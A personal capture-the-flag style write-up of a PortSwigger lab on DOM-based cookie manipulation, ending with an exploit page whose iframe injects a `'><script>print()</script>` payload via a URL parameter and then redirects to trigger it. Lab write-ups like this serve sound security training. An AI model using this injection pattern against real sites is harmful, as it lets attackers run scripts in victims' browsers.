# exploit

- Required:
    
    + This lab demonstrates DOM-based client-side cookie manipulation.
    
    +  You will need to use the exploit server to direct the victim to the correct pages.
    
- Goal:
    
    + To solve this lab, inject a cookie that will cause [XSS](https://portswigger.net/web-security/cross-site-scripting) on a different page and call the print() function
    
- Steps:
- Analysis:
    
    +  After I browse through the page, I go check the HTML sources. One interesting piece of HTML can be found on the product pages:
    
    ![exploit%20364a353bd8b94165bb3728cb8d504bcf/image1.png](exploit%20364a353bd8b94165bb3728cb8d504bcf/image1.png)
    
    + This script stores the current page by URL in the cookie
    
    ![exploit%20364a353bd8b94165bb3728cb8d504bcf/image2.png](exploit%20364a353bd8b94165bb3728cb8d504bcf/image2.png)
    
    + From this moment onwards, the requests are sent with that cookie and the page contains a Last viewed product link at the top:
    
    ![exploit%20364a353bd8b94165bb3728cb8d504bcf/image3.png](exploit%20364a353bd8b94165bb3728cb8d504bcf/image3.png)
    
    ![exploit%20364a353bd8b94165bb3728cb8d504bcf/image4.png](exploit%20364a353bd8b94165bb3728cb8d504bcf/image4.png)
    
    + First I test whether the application verifies that the target is within its own domain:
    
    ![exploit%20364a353bd8b94165bb3728cb8d504bcf/image5.png](exploit%20364a353bd8b94165bb3728cb8d504bcf/image5.png)
    
    + Next, I check if I can break out of the link and inject arbitrary HTML and JavaScript:
    
    ![exploit%20364a353bd8b94165bb3728cb8d504bcf/image6.png](exploit%20364a353bd8b94165bb3728cb8d504bcf/image6.png)
    
    + Sure enough, the cookie value can be used to execute arbitrary JavaScript in the scope of the page.
    
- **The malicious page**
    
    + My malicious page loads the vulnerable product details page within an iframe, with my payload added as a URL parameter.
    
    + After a few milliseconds, the frame content gets redirected to the base URL of the shop, thus triggering the script.
    
    <iframe name="victim" id="victim"
    
    src="https://0ae5007c0406e52ec028374700af0043.web-security-academy.net/product?productId=1&'><script>print()</script>"
    
    ></iframe>
    
    <script>
    
    setTimeout(() => { document.getElementsByName('victim')[0].src = "https://0ae5007c0406e52ec028374700af0043.web-security-academy.net"}, 500);
    
    </script>
    
    ![exploit%20364a353bd8b94165bb3728cb8d504bcf/image7.png](exploit%20364a353bd8b94165bb3728cb8d504bcf/image7.png)